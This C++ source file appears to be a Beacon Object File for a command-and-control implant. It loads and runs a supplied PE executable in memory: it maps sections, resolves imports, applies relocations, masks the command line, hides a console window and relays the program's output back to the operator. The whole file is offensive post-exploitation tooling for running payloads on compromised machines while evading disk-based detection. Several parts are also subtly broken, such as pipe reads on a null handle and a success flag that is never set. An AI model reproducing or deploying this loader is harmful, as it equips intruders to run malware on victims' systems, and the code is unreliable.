#include <General.hpp>
#include <PE/IAT.cc>

#define DEFAULT_BUFF_SIZE 0x2000

struct _PE_DATA {
    HANDLE ThreadHandle;
    BOOL   Masked;
    FILE*  fErr;
    FILE*  fOut;
    INT32  fO;    
    HANDLE PipeWrite;
    HANDLE PipeRead;
    PVOID  Base;
    ULONG  Size;
    PVOID  EntryPtr;
};
typedef _PE_DATA PE_DATA;

auto Fix::Tls( PVOID Base, PVOID DataDir ) -> VOID {
    if ( static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size ) {
        PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( (UPTR)( Base ) + static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->VirtualAddress );
        PIMAGE_TLS_CALLBACK* Callback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

        if ( Callback ) {
            for ( INT i = 0; Callback[i] != nullptr; ++i ) {
                Callback[i]( Base, DLL_PROCESS_ATTACH, nullptr );
            }
        }
    }
}

auto Fix::Exp( PVOID Base, PVOID DataDir ) -> VOID {
    if ( static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size ) {
        PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)( (UPTR)( Base ) + static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->VirtualAddress );

        RtlAddFunctionTable( (PRUNTIME_FUNCTION)FncEntry, static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ), (UPTR)( Base ) );
    }
}

auto Fix::Imp( PVOID Base, PVOID DataDir ) -> BOOL {
    PIMAGE_IMPORT_DESCRIPTOR ImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)( (UPTR)( Base ) + static_cast<IMAGE_DATA_DIRECTORY*>( DataDir )->VirtualAddress );

    for ( ; ImpDesc->Name; ImpDesc++ ) {

	    PIMAGE_THUNK_DATA FirstThunk  = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->FirstThunk );
	    PIMAGE_THUNK_DATA OriginThunk = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->OriginalFirstThunk );

	    PCHAR  DllName = (CHAR*)( (UPTR)( Base ) + ImpDesc->Name );
        PVOID  DllBase = (PVOID)( GetModuleHandleA( DllName ) );

        PVOID  FunctionPtr = 0;
        STRING AnsiString  = { 0 };

        if ( !DllBase ) {
            DllBase = (PVOID)LoadLibraryA( DllName );
        }

		if ( !DllBase ) {
            return FALSE;
		}

		for ( ; OriginThunk->u1.Function; FirstThunk++, OriginThunk++ ) {

			if ( IMAGE_SNAP_BY_ORDINAL( OriginThunk->u1.Ordinal ) ) {

                LdrGetProcedureAddress( 
                    (HMODULE)DllBase, NULL, IMAGE_ORDINAL( OriginThunk->u1.Ordinal ), &FunctionPtr
                );

                FirstThunk->u1.Function = (UPTR)( FunctionPtr );
				if ( !FirstThunk->u1.Function ) return FALSE;

			} else {
				PIMAGE_IMPORT_BY_NAME Hint = (PIMAGE_IMPORT_BY_NAME)( (UPTR)( Base ) + OriginThunk->u1.AddressOfData );

                for ( INT i = 0; i < sizeof( IAT::Table ); i++ ) {
                    if ( Str::CompareA( IAT::Table[i].Name, Hint->Name ) ) {
                        FunctionPtr = IAT::Table[i].Ptr;
                        FirstThunk->u1.Function = (UPTR)( FunctionPtr );
                        if ( !FirstThunk->u1.Function ) return FALSE;
                        return TRUE;
                    }
                }

                {
                    AnsiString.Length        = Str::LengthA( Hint->Name );
                    AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                    AnsiString.Buffer        = Hint->Name;
                }
                
				LdrGetProcedureAddress( 
                    (HMODULE)DllBase, &AnsiString, 0, &FunctionPtr 
                );
                FirstThunk->u1.Function = (UPTR)( FunctionPtr );

				if ( !FirstThunk->u1.Function ) return FALSE;
			}
		}
	}
	
	return TRUE;
}

auto Fix::Rel( PVOID Base, UPTR Delta, PVOID DataDir ) -> VOID {
    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)( (UPTR)( Base ) + static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->VirtualAddress );
    PIMAGE_RELOC           RelocInf  = { 0 };
    UPTR              RelocPtr  = NULL;

    while ( BaseReloc->VirtualAddress ) {
        
        RelocInf = (PIMAGE_RELOC)( BaseReloc + 1 ); 
        RelocPtr = ( (UPTR)( Base ) + BaseReloc->VirtualAddress );

        while ( (BYTE*)( RelocInf ) != (BYTE*)( BaseReloc ) + BaseReloc->SizeOfBlock ) {
            switch ( RelocInf->Type ) {
            case IMAGE_REL_TYPE:
                *(UPTR*)( RelocPtr + RelocInf->Offset ) += (UPTR)( Delta ); break;
            case IMAGE_REL_BASED_HIGHLOW:
                *(ULONG*)( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
            case IMAGE_REL_BASED_HIGH:
                *(WORD*)( RelocPtr + RelocInf->Offset ) += HIWORD( Delta ); break;
            case IMAGE_REL_BASED_LOW:
                *(WORD*)( RelocPtr + RelocInf->Offset ) += LOWORD( Delta ); break;
            default:
                break;
            }

            RelocInf++;
        }

        BaseReloc = (PIMAGE_BASE_RELOCATION)RelocInf;
    };

    return;
}

auto MaskCommandLine(VOID) -> VOID {
    IAT::CmdWide = Mem::Alloc<WCHAR*>( MAX_PATH * sizeof(WCHAR) );
    
    for ( INT i = 0; IAT::CmdAnsi[i] != '\0' && i < MAX_PATH - 1; i++ ) {
        IAT::CmdWide[i] = static_cast<WCHAR>( IAT::CmdAnsi[i] );
    }
    IAT::CmdWide[MAX_PATH - 1] = L'\0';

    IAT::PoiArgvW = CommandLineToArgvW( IAT::CmdWide, &IAT::CmdArgc );
    
    if ( IAT::PoiArgvW && IAT::CmdArgc > 0 ) {
        if ( auto argcPtr = IAT::__p___argc() ) {
            *argcPtr = IAT::CmdArgc;
        }
        
        if ( auto argvPtr = IAT::__p___argv() ) {
            *argvPtr = reinterpret_cast<CHAR**>( IAT::PoiArgvW );
        }
        
        if ( auto wargvPtr = IAT::__p___wargv() ) {
            *wargvPtr = IAT::PoiArgvW;
        }
    }
}

EXTERN_C
auto go( CHAR* Args, INT32 Argc ) -> VOID {
    Data Parser = { 0 };

    BeaconDataParse( &Parser, Args, Argc );

    INT32 Length    = 0;
    BYTE* Buffer    = (BYTE*)BeaconDataExtract( &Parser, &Length );
    INT32 ArgLen    = 0;
    BYTE* Arguments = (BYTE*)BeaconDataExtract( &Parser, &ArgLen );
    CHAR* ExportFnc = (CHAR*)BeaconDataExtract( &Parser, 0 ); // dll functions export case
    CHAR* PeKey     = (CHAR*)BeaconDataExtract( &Parser, 0 );
    INT32 TimeOut   = BeaconDataInt( &Parser );
    INT8  AllocMtd  = BeaconDataInt( &Parser );
    INT8  WriteMtd  = BeaconDataInt( &Parser );

    UPTR   Entry     = 0;
    ULONG  ThreadID  = 0;
    ULONG* Reads     = { 0 };
    BOOL   IsDLL     = FALSE;
    HWND   WinHandle = nullptr;
    HANDLE hThread   = INVALID_HANDLE_VALUE;
    HANDLE BackupOut = INVALID_HANDLE_VALUE;
    HANDLE PipeRead  = INVALID_HANDLE_VALUE;
    HANDLE PipeWrite = INVALID_HANDLE_VALUE;

    FILE* fErr = nullptr;
    FILE* fOut = nullptr;
    INT32 fO   = 0;

    ULONG Delta   = 0;
    ULONG ImgSize = 0;
    PVOID ImgBase = nullptr;

    ULONG WaitResult = 0;
    BOOL  Success    = FALSE;
    ULONG AvailBts   = 0;
    BOOL  IsDone     = FALSE;
    BYTE* OutBuffer  = nullptr;
    ULONG OutLength  = 0;

    LARGE_INTEGER Frequency, Before, After, ExecTime;
    SECURITY_ATTRIBUTES SecAttr = { 0 };

    IMAGE_NT_HEADERS*     Header = { 0 };
    IMAGE_SECTION_HEADER* SecHdr = { 0 };
    IMAGE_DATA_DIRECTORY* RelDir = { 0 };
    IMAGE_DATA_DIRECTORY* ExpDir = { 0 };
    IMAGE_DATA_DIRECTORY* TlsDir = { 0 };
    IMAGE_DATA_DIRECTORY* ImpDir = { 0 };

    Header = (IMAGE_NT_HEADERS*)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
    SecHdr = IMAGE_FIRST_SECTION( Header );
    RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ExpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    TlsDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    ImgSize = Header->OptionalHeader.SizeOfImage;
    IsDLL   = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;

    if ( AllocMtd == Alloc::Default ) {
        ImgBase = VirtualAlloc( nullptr, ImgSize, MEM_COMMIT, PAGE_READWRITE );
    } else if ( AllocMtd == Alloc::Drip ) {
        // ImgBase = BeaconDripAlloc
    }
    
    if ( ! ImgBase ) {
        return;
    }

    Entry = ( U_PTR( ImgBase ) + Header->OptionalHeader.AddressOfEntryPoint );
    Delta = ( U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        Mem::Copy<PVOID>(
            PTR( U_PTR( ImgBase ) + SecHdr[i].VirtualAddress ),
            PTR( U_PTR( Buffer )  + SecHdr[i].PointerToRawData ),
            SecHdr[i].SizeOfRawData
        );
    }

    Fix::Imp( ImgBase, ImpDir );
    Fix::Rel( ImgBase, Delta, RelDir );
    Fix::Exp( ImgBase, ExpDir );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;
        ULONG    MemoryProtection = 0;
        ULONG    OldProtection    = 0;
		
		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			MemoryProtection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			MemoryProtection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			MemoryProtection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			MemoryProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READWRITE;

        if ( ! ( VirtualProtect( SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return; }
    }

    if ( ! ( WinHandle = GetConsoleWindow() ) ) {
        if ( AllocConsole() ) {
            WinHandle = GetConsoleWindow();
            ShowWindow( WinHandle, SW_HIDE );
        }
    }

    freopen_s( &fOut, "CONOUT$", "r+", stdout );
    freopen_s( &fErr, "CONOUT$", "r+", stderr );

    SecAttr = { sizeof( SecAttr ), nullptr, TRUE };
    CreatePipe( &PipeRead, &PipeWrite, &SecAttr, 0 );

    SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
    SetStdHandle( STD_ERROR_HANDLE, PipeWrite );

    fO = _open_osfhandle( (intptr_t)PipeWrite, _O_TEXT );

    _dup2( fO, _fileno( fOut ) );
    _dup2( fO, _fileno( fErr ) );

    _dup2( fO, 1 );
    _dup2( fO, 2 );

    QueryPerformanceFrequency( &Frequency );
    QueryPerformanceCounter( &Before );

    hThread = CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE )Entry, nullptr, 0, &ThreadID );

    OutBuffer = Mem::Alloc<BYTE*>( DEFAULT_BUFF_SIZE );

    do {
        QueryPerformanceCounter( &After );

        if ( ( ( After.QuadPart - Before.QuadPart ) / Frequency.QuadPart ) > TimeOut ) {
            TerminateThread( hThread, WAIT_TIMEOUT );
            Success = FALSE;
        }

        WaitResult = WaitForSingleObject( hThread, WAIT_TIMEOUT );

        switch ( WaitResult ) {
            case WAIT_ABANDONED:
                break;
            case WAIT_FAILED:
                break;
            case WAIT_TIMEOUT:
                break;
            case WAIT_OBJECT_0:
                IsDone = TRUE; break;
        }

        PeekNamedPipe( 0, nullptr, 0, nullptr, &AvailBts, nullptr );

        if ( AvailBts ) {
            Mem::Set<BYTE*>( OutBuffer, 0, DEFAULT_BUFF_SIZE );
            ReadFile( 0, OutBuffer, DEFAULT_BUFF_SIZE - 1, &OutLength, nullptr );

            BeaconPrintf( CALLBACK_OUTPUT, "%s", OutBuffer );
        }
    } while ( ! IsDone || ! AvailBts );

    if (Success) {
        ExecTime.QuadPart = After.QuadPart - Before.QuadPart;
        
        double seconds = (double)ExecTime.QuadPart / (double)Frequency.QuadPart;
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[+] PE execution completed in %.3f seconds\n", seconds);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[x] Failed to read all output of PE\n");
    }

    return;
}